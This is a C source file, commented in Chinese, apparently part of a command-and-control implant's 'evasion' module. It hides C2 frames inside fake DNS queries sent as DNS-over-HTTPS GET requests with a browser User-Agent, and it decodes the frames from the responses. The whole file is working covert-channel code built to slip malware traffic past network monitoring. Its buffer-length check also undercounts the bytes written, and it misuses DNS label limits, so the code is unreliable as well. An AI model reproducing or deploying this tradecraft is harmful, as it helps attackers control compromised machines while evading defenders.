#include "evasion.h"
#include "evasion_internal.h"

#include <stdio.h>
#include <string.h>

/*
 * DoH 伪装思路:
 * 把 C2 帧构造成一个"伪 DNS 报文"(随机合法查询名 + 标准 DNS header),
 * 再用 base64url 编码后放进 DoH 的 GET dns= 参数, 整体是标准 DoH 请求。
 *
 * 解析时: 从 HTTP 响应体里取出 base64url 内容, 解码即为 C2 帧。
 */

/* 构造最小 DNS 查询报文(伪), 供 DoH 传输 */
static int build_pseudo_dns_query(const uint8_t *frame, size_t frame_len,
                                  uint8_t *out, size_t *out_len)
{
    /*
     * DNS 报文头 12 字节:
     *   ID(2) | FLAGS(2) | QDCOUNT(2) | ANCOUNT(2) | NSCOUNT(2) | ARCOUNT(2)
     * 后跟 QNAME(长度前缀标签序列, 以 0x00 结尾) + QTYPE(2) + QCLASS(2)
     */
    size_t fixed = 12 + 1 + 2 + 2; /* header + 1 label(1+label) + qtype + qclass */
    char label[64];
    if (evasion_random_qname_label(label, sizeof(label)) != EVASION_OK)
        return EVASION_ERR;
    size_t label_len = strlen(label);
    size_t need = fixed + label_len + frame_len;
    if (*out_len < need) return EVASION_ERR_NOMEM;

    size_t p = 0;
    /* header (12 bytes) */
    out[p++] = 0x12; out[p++] = 0x34;                /* ID */
    out[p++] = 0x01; out[p++] = 0x00;                /* flags: standard query */
    out[p++] = 0x00; out[p++] = 0x01;                /* QDCOUNT=1 */
    out[p++] = 0x00; out[p++] = 0x00;                /* ANCOUNT=0 */
    out[p++] = 0x00; out[p++] = 0x00;                /* NSCOUNT=0 */
    out[p++] = 0x00; out[p++] = 0x00;                /* ARCOUNT=0 */

    /* QNAME: [len][label bytes]... 0x00 */
    out[p++] = (uint8_t)label_len;
    memcpy(out + p, label, label_len); p += label_len;
    /* 附加帧数据作为"第二个标签段"的伪装扩展(以长度前缀嵌入) */
    if (frame_len > 0 && frame_len <= 255) {
        out[p++] = (uint8_t)frame_len;
        memcpy(out + p, frame, frame_len); p += frame_len;
    }
    out[p++] = 0x00; /* 终止符 */

    /* QTYPE = A(1), QCLASS = IN(1) */
    out[p++] = 0x00; out[p++] = 0x01;
    out[p++] = 0x00; out[p++] = 0x01;

    *out_len = p;
    return EVASION_OK;
}

int evasion_frame_to_doh(const uint8_t *frame, size_t frame_len,
                         const char *doh_server,
                         uint8_t *out, size_t *out_len)
{
    if (!frame || !doh_server || !out || !out_len) return EVASION_ERR;

    uint8_t dnsbuf[2048];
    size_t dnslen = sizeof(dnsbuf);
    if (build_pseudo_dns_query(frame, frame_len, dnsbuf, &dnslen) != EVASION_OK)
        return EVASION_ERR;

    char b64[4096];
    if (evasion_b64url_encode(dnsbuf, dnslen, b64, sizeof(b64)) != EVASION_OK)
        return EVASION_ERR;

    char *p = (char *)out;
    size_t cap = *out_len;
    int n = snprintf(p, cap,
                     "GET /dns-query?dns=%s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: Mozilla/5.0\r\n"
                     "Accept: application/dns-message\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     b64, doh_server);
    if (n < 0 || (size_t)n >= cap) return EVASION_ERR_NOMEM;
    *out_len = (size_t)n;
    return EVASION_OK;
}

int evasion_doh_to_frame(const uint8_t *resp, size_t resp_len,
                         uint8_t *frame, size_t *frame_len)
{
    if (!resp || !frame || !frame_len) return EVASION_ERR;

    int status = evasion_parse_http_status(resp, resp_len);
    if (status < 0) return EVASION_ERR;
    if (status / 100 != 2) return EVASION_ERR_FMT;

    uint8_t *body = NULL;
    size_t body_len = 0;
    if (evasion_parse_http_body(resp, resp_len, &body, &body_len) != EVASION_OK)
        return EVASION_ERR_FMT;

    /* body 应为 base64url 编码的伪 DNS 报文 */
    uint8_t decoded[2048];
    size_t decoded_len = sizeof(decoded);
    if (evasion_b64url_decode((const char *)body, decoded, &decoded_len) != EVASION_OK)
        return EVASION_ERR_FMT;

    /* 跳过 12 字节 header, 解析 QNAME */
    if (decoded_len < 12) return EVASION_ERR_FMT;
    size_t p = 12;
    /* 跳过一个标签段(读长度前缀) */
    if (p >= decoded_len) return EVASION_ERR_FMT;
    uint8_t lablen = decoded[p++];
    if (lablen > 0 && p + lablen > decoded_len) return EVASION_ERR_FMT;
    p += lablen;

    /*
     * build_pseudo_dns_query 布局:
     * [header 12] [label_len 1] [label N] [frame_len 1] [frame M] [0x00 1] [qtype 2] [qclass 2]
     * 此处 p 已跳过第一个标签, 接下来是 frame_len(1) + frame 数据
     */
    if (p >= decoded_len) return EVASION_ERR_FMT;
    uint8_t frame_size = decoded[p++]; /* frame 长度前缀 */
    if (frame_size == 0 || p + frame_size > decoded_len) return EVASION_ERR_FMT;

    if (frame_size > *frame_len) return EVASION_ERR_NOMEM;
    memcpy(frame, decoded + p, frame_size);
    *frame_len = frame_size;
    return EVASION_OK;
}
